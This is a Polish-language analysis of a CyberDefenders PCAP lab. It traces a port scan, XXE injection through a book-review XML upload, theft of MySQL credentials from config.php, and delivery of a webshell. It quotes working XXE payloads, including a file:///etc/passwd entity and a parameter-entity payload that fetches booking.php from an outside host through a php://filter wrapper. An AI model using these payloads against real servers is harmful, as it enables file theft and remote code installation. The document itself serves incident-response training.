# Analiza incydentu - XXE Injection (upload XML) -> kradzież creds do MySQL -> webshell

> **Platforma:** Wireshark (+ CyberChef)
> **Źródło:** CyberDefenders - lab XXE Infiltration (analiza PCAP)
> **Typ zdarzenia:** Reconnaissance (Port Scan) -> Initial Access (XXE) -> Credential Access (config.php) -> Valid Accounts (MySQL) -> Persistence (Webshell)
> **Severity:** Critical
> **MITRE ATT&CK:** T1046, T1190, T1005, T1552.001, T1078, T1105, T1505.003

---

## Podsumowanie

Automatyczny alert wykrył nietypowe dane XML przetwarzane przez serwer sklepu `pageturner4books.net` (`50.239.151.185`, Apache 2.4.58 / Ubuntu), co wskazywało na **XXE (XML External Entity) Injection**.

Atakujący z IP `210.106.114.183` zaczął od **skanu portów** (najwyższy otwarty port: `3306` - MySQL). Potem wykorzystał formularz recenzji książek (`/review/form.html`), który wysyła pliki XML do **`/review/upload.php`**. Skrypt parsuje XML z włączonymi **external entities** (odwołaniami w XML do pliku albo URL-a, które parser sam "rozwija" i wstawia ich zawartość), więc atakujący wgrywał pliki o "książkowych" nazwach (`TheGreatGatsby.xml`, `1984.xml`, `ToKillaMockingbird.xml`) i kazał serwerowi **czytać własne pliki z dysku**.

Z odczytanego **`config.php`** zdobył dane do bazy (`webuser` / `Winter2024`), **zalogował się do MySQL** (port 3306 z internetu), a na koniec plikiem `PrideandPrejudice.xml` kazał serwerowi pobrać **webshell `booking.php`** ze swojego serwera `203.0.113.15`.

---

## Kontekst

### Czym jest XXE

XML pozwala definiować **entities** - coś jak zmienne: definiujesz je raz w `<!DOCTYPE>`, a potem wstawiasz w dokumencie jako `&nazwa;`. **External entity** (słowo kluczowe `SYSTEM`) nie ma wartości wpisanej na sztywno, tylko bierze ją z pliku albo URL-a:
```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```
Jeśli parser na serwerze ma włączone ładowanie external entities, to przy przetwarzaniu `&xxe;` **sam odczyta plik z dysku serwera** i wstawi go do dokumentu. Jeśli aplikacja zwraca przetworzony XML w odpowiedzi, atakujący dostaje zawartość pliku.

Skutki XXE:
- **odczyt plików** (`file://`) - konfiguracje, hasła, kod źródłowy,
- **SSRF** (Server-Side Request Forgery) - serwer robi żądania HTTP tam, gdzie wskaże atakujący (`http://`),
- w PHP dodatkowo **wrappery** (`php://filter`), np. do kodowania pliku w base64.

### Jak czytać upload w PCAP

Upload pliku przez formularz to `POST` z `Content-Type: multipart/form-data`:
- **pierwsza linia** (`POST /review/upload.php`) - skrypt, który odbiera i przetwarza plik = podatny endpoint,
- **`Content-Disposition: ... filename="TheGreatGatsby.xml"`** - nazwa wgranego pliku,
- pod spodem **treść pliku** (payload XXE),
- poniżej **odpowiedź serwera** - tu widać, czy XXE zadziałało i co wyciekło.

---

## IOC (Indicators of Compromise)

| Typ | Wartość |
|---|---|
| IP atakującego | `210.106.114.183` |
| Serwer hostujący webshell | `203.0.113.15` |
| Zaatakowany serwer | `50.239.151.185` (`pageturner4books.net`, Apache/2.4.58 Ubuntu) |
| Podatny endpoint | `/review/upload.php` (formularz `/review/form.html`) |
| Złośliwe pliki XML | `TheGreatGatsby.xml`, `1984.xml`, `ToKillaMockingbird.xml`, `PrideandPrejudice.xml` |
| Odczytane pliki | `/etc/passwd`, `/var/www/html/index.php`, `/var/www/html/config.php` |
| Skradzione dane do bazy | `webuser` / `Winter2024` (baza `pageturner`, MySQL 8.0.36) |
| Webshell | `booking.php` (`http://203.0.113.15/booking.php`) |
| Wystawiony port | `3306/tcp` (MySQL dostępny z internetu) |
| User-Agent | `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0` |

---

## 5W

| Pytanie | Odpowiedź |
|---|---|
| **Who** (kto) | Atakujący z IP `210.106.114.183`, webshell hostowany na `203.0.113.15`; użyte konto bazy `webuser` |
| **What** (co) | Skan portów -> XXE przez upload XML -> odczyt `config.php` -> logowanie do MySQL skradzionymi danymi -> wgranie webshella `booking.php` |
| **When** (kiedy) | 2024-05-31, ok. 11:47 (skan) - 12:15:42 (webshell) UTC |
| **Where** (gdzie) | `pageturner4books.net` (`50.239.151.185`): endpoint `/review/upload.php`, pliki w `/var/www/html/`, MySQL na `3306` |
| **Why** (po co) | Dostęp do bazy sklepu (dane klientów) i trwały dostęp do serwera przez webshell (RCE) |

---

## Przebieg analizy 


### Krok 1 - skan portów i najwyższy otwarty port

```
tcp.flags.syn==1 && tcp.flags.ack==1
```
W SYN scanie atakujący wysyła SYN, a ofiara odpowiada:
- **SYN-ACK** = port otwarty,
- **RST-ACK** = port zamknięty,


Filtr pokazuje tylko SYN-ACK, czyli odpowiedzi z otwartych portów. Otwarty port to **Source Port** odpowiedzi ofiary. Dodałem go jako kolumnę (prawy klik na `Source Port` -> **Apply as Column**) i posortowałem malejąco.

> Ustalono: najwyższy otwarty port to `3306` (MySQL). Baza wystawiona do internetu - to wykorzystał później.

*Lekcja: nie trzeba scrollować tysięcy pakietów. Kolumna z polem + sortowanie daje odpowiedź od razu.*

<img width="1920" height="810" alt="Zrzut ekranu (1304)" src="https://github.com/user-attachments/assets/27a4720b-d873-4738-a57e-f7b3a1187b8f" />


---

### Krok 2 - podatny endpoint i pierwszy złośliwy plik

```
http.request.method==POST && xml
```
- `http.request.method==POST` - żądania wysyłające dane na serwer (formularze, uploady),
- `xml` - tylko te z treścią XML.

<img width="1920" height="800" alt="Zrzut ekranu (1305)" src="https://github.com/user-attachments/assets/d53dd5f9-d3df-4926-931e-df837716b6f6" />


Przy alercie o XXE to najkrótsza droga do payloadów. Na pierwszym wyniku zrobiłem Follow -> HTTP Stream:
```
tcp.stream eq 10459
```
**Ujawniło:**
- `POST /review/upload.php` z `Referer: /review/form.html` - atakujący użył zwykłego formularza recenzji,
- `filename="TheGreatGatsby.xml"` - pierwszy złośliwy plik,
- payload: `<!ENTITY xxe SYSTEM "file:///etc/passwd">` - klasyczny test, czy XXE działa,
- odpowiedź `200 OK` (11:55:09 GMT).

> Ustalono: podatny skrypt to `/review/upload.php`, pierwszy złośliwy plik to `TheGreatGatsby.xml`.

*Lekcja: nazwy plików udają recenzje książek (pasuje do sklepu), żeby nie rzucać się w oczy w logach.*

<img width="1920" height="807" alt="Zrzut ekranu (1292)" src="https://github.com/user-attachments/assets/fa6c7dd9-73fd-4fe6-aea2-1021c8bed138" />


---

### Krok 3 - rekonesans kodu aplikacji (index.php)

```
tcp.stream eq 10460
```
**Ujawniło:** `1984.xml` z entity `file:///var/www/html/index.php`. W odpowiedzi (12:01:00 GMT) serwer zwrócił **kod źródłowy strony głównej** - widać `include 'header.php'`, `include 'footer.php'`.

> Ustalono: XXE działa i zwraca pliki. Atakujący poznał strukturę aplikacji w `/var/www/html/`.

<img width="1920" height="800" alt="Zrzut ekranu (1308)" src="https://github.com/user-attachments/assets/3fcee2d4-8bfc-45f0-959f-dd4467f9c295" />


---

### Krok 4 - odczyt pliku konfiguracyjnego i hasło do bazy

```
tcp.stream eq 10462
```
**Ujawniło:** `ToKillaMockingbird.xml` z entity `file:///var/www/html/config.php`. W odpowiedzi (12:03:12 GMT) cała zawartość configu:
```php
$db_host = 'localhost';
$db_name = 'pageturner';
$db_user = 'webuser';
$db_pass = 'Winter2024';
```

> Ustalono: plik konfiguracyjny to `config.php`, hasło użytkownika bazy `webuser` to `Winter2024`.

*Lekcja: hasło do bazy trzymane jawnie w pliku w katalogu webowym. Jedna podatność odczytu plików = pełne dane do bazy.*

<img width="1920" height="799" alt="Zrzut ekranu (1294)" src="https://github.com/user-attachments/assets/6a2fab46-a9e6-4fe8-ae66-c93fdcb54327" />

<img width="1920" height="798" alt="Zrzut ekranu (1295)" src="https://github.com/user-attachments/assets/4669e6b6-c5da-4247-ac1e-b46a2aa80ed1" />


---

### Krok 5 - logowanie do MySQL skradzionymi danymi

```
mysql.login_request
```
**Ujawniło:** dwie grupy Login Request z `210.106.114.183` na `3306`:
- **11:47:24** - zaraz po skanie, serwer odpowiada `#08S01 Bad handshake`. To sondowanie usługi podczas skanu (np. wykrywanie wersji), a nie logowanie - atakujący nie miał jeszcze hasła (config odczytany o 12:03),
- **12:08** - nowe połączenie (`SYN` na `3306` -> `Server Greeting` MySQL 8.0.36 -> Login Request) już **po** kradzieży danych = pierwsza próba logowania skradzionymi creds.

Pole `Username` jest puste, bo klient ma flagę `Switch to SSL after handshake: Set` - login i hasło idą już w zaszyfrowanym TLS. Dlatego moment logowania ustaliłem po **czasie ramki**, a nie po nazwie użytkownika. Czas sprawdziłem też w CyberChef (**From UNIX Timestamp** na `Epoch Arrival Time`).

> Ustalono: pierwsza próba logowania do MySQL skradzionymi danymi - `2024-05-31 12:08` UTC.

*Lekcja: pierwszy wynik filtra to nie zawsze odpowiedź. Trzeba go zestawić z osią czasu - logowanie skradzionym hasłem musi być PO jego kradzieży.*


<img width="1920" height="805" alt="Zrzut ekranu (1309)" src="https://github.com/user-attachments/assets/6cd0786e-95ed-4e3e-a6ec-4fd96ad259ba" />


---

### Krok 6 - webshell

```
tcp.stream eq 10464
```
**Ujawniło:** `PrideandPrejudice.xml` (12:15:42) z innym payloadem niż wcześniej:
```xml
<!ENTITY % payload SYSTEM "http://203.0.113.15/booking.php">
<!ENTITY % internals "<!ENTITY file SYSTEM 'php://filter/read=convert.base64-encode/resource=%payload;'>">
<foo>&file;</foo>
```
- zamiast `file://` jest **`http://`** - serwer ofiary sam pobiera plik z serwera atakującego (`203.0.113.15`),
- `%payload` i `%internals` to **parameter entities** (ze znakiem `%`), używane wewnątrz DTD do budowania kolejnych entities,
- `php://filter/...base64-encode` - wrapper PHP kodujący zasób w base64.

> Ustalono: webshell to `booking.php`, hostowany na `203.0.113.15`.

*Lekcja: nazwa `booking.php` ma wyglądać jak normalna część sklepu. Przy szukaniu webshelli patrz na pliki `.php`, których nie ma w normalnej strukturze aplikacji.*

<img width="1920" height="803" alt="Zrzut ekranu (1302)" src="https://github.com/user-attachments/assets/6209bd33-a855-419a-a4ff-37b5dab1a11d" />


---


**Atakujący:** `210.106.114.183` ---HTTP :80 (XXE)---> **pageturner4books.net** `50.239.151.185` ---MySQL :3306 (`webuser`)---> **baza `pageturner`**
**Webshell:** `50.239.151.185` <---HTTP--- `203.0.113.15/booking.php`

---

## MITRE ATT&CK

| Technika | ID | Gdzie w incydencie |
|---|---|---|
| Network Service Discovery | T1046 | SYN scan, wykrycie otwartego `3306` |
| Exploit Public-Facing Application | T1190 | XXE w `/review/upload.php` |
| Data from Local System | T1005 | odczyt `/etc/passwd`, `index.php`, `config.php` przez `file://` |
| Unsecured Credentials: Credentials In Files | T1552.001 | `$db_pass = 'Winter2024'` jawnie w `config.php` |
| Valid Accounts | T1078 | logowanie do MySQL kontem `webuser` |
| Ingress Tool Transfer | T1105 | pobranie `booking.php` z `203.0.113.15` |
| Server Software Component: Web Shell | T1505.003 | webshell `booking.php` |

<img width="1021" height="225" alt="Zrzut ekranu (1283)" src="https://github.com/user-attachments/assets/bff3f559-10ff-4189-9c6c-8e3d14f8e991" />
<img width="1006" height="228" alt="Zrzut ekranu (1290)" src="https://github.com/user-attachments/assets/1404e50c-75fe-482a-9f1a-ee4c36a44f63" />
<img width="1045" height="222" alt="Zrzut ekranu (1291)" src="https://github.com/user-attachments/assets/e94d9a3f-0559-47e7-b73c-d0b4252550d2" />
<img width="1056" height="267" alt="Zrzut ekranu (1293)" src="https://github.com/user-attachments/assets/05d53ee1-c09f-44f2-9097-ee526bf75562" />
<img width="1017" height="191" alt="Zrzut ekranu (1297)" src="https://github.com/user-attachments/assets/f351449d-4e6e-4e4d-b6a5-74193221c667" />
<img width="1020" height="251" alt="Zrzut ekranu (1299)" src="https://github.com/user-attachments/assets/c5357012-1540-4905-8621-496ccd7f787d" />
<img width="1011" height="230" alt="Zrzut ekranu (1300)" src="https://github.com/user-attachments/assets/e3fc8a87-935d-46d0-a400-01cda421c321" />



